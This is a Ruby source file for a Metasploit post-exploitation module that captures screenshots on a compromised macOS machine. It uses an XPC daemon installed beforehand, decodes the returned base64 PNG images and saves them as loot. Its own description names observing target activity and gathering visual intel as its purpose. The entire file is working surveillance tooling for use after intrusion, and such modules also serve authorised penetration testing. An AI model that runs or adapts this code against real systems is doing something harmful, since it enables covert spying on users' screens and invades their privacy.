##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require_relative '../../lib/xpc_helper'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::OSX::Priv
  include Msf::Post::OSX::XPCDaemon
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'         => 'macOS XPC Screenshot Capture',
        'Description'  => %q{
          Captures one or more screenshots of the macOS desktop via the XPC daemon.
          The daemon returns base64-encoded PNG data which is decoded and stored as
          loot. Useful for observing target activity and gathering visual intel.
        },
        'License'      => MSF_LICENSE,
        'Author'       => ['Mr.Gedik'],
        'Platform'     => ['osx'],
        'SessionTypes' => ['meterpreter', 'shell']
      )
    )

    register_options([
      OptInt.new('COUNT', [true, 'Number of screenshots to capture', 1]),
    ])
  end

  def run
    unless xpc_client_exists?
      print_error("XPC client not found. Run xpc_daemon_install first.")
      return
    end

    count = datastore['COUNT'].to_i
    count = 1 if count < 1

    print_status("Capturing #{count} screenshot(s) via XPC daemon...")

    count.times do |i|
      data = xpc_exec!('ss', timeout: 30)
      next if data.nil?

      png_b64 = data.is_a?(Hash) ? (data['image'] || data['png'] || data['data']) : data.to_s
      if png_b64.nil? || png_b64.to_s.empty?
        print_error("Screenshot #{i + 1}: no image data returned")
        next
      end

      begin
        png_data = Base64.decode64(png_b64.to_s)
      rescue => e
        print_error("Screenshot #{i + 1}: base64 decode failed - #{e.message}")
        next
      end

      timestamp = Time.now.strftime('%Y%m%d_%H%M%S')
      loot_path = store_loot(
        'osx.xpc.screenshot',
        'image/png',
        session,
        png_data,
        "screenshot_#{timestamp}_#{i + 1}.png",
        "macOS screenshot capture #{i + 1} via XPC"
      )
      print_good("Screenshot #{i + 1}/#{count} saved to #{loot_path} (#{png_data.length} bytes)")

      sleep 1 if i < count - 1
    end
  end
end
